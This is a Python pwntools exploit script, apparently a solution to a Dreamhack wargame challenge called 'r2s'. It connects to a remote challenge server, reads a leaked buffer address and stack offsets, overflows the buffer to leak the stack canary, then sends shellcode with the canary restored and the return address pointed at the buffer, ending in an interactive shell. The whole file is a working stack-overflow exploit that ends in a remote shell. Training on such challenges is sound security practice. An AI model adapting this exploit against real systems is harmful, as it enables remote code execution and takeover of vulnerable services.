from pwn import *

def slog(n, m): return success(': '.join([n, hex(m)]))

context.arch = 'amd64'

p = remote("host1.dreamhack.games", 16340)
# p = process('r2s')

# Get buffer address
p.recvuntil(b"buf: ")
buf = int(p.recvline()[:-1], 16)
slog("Address of buf: ", buf)

p.recvuntil(b"$rbp: ")
buf2sfp = int(p.recvline().split()[0])
slog("buf2sfp: ", buf2sfp)

buf2canary = buf2sfp - 8
slog("buf2canary: ", buf2canary)

# Wait until first input timing
payload = b'A' * (buf2canary + 1)
p.sendafter(b'Input:', payload)
p.recvuntil(payload)
canary = u64(b'\x00'+p.recvn(7))
slog('Canary', canary)

# Now inject shellcode with canary value
sh = asm(shellcraft.sh())
payload = sh.ljust(buf2canary, b'A') + p64(canary) + b'B'*0x8 + p64(buf)
p.sendlineafter(b"Input:", payload)

p.interactive()
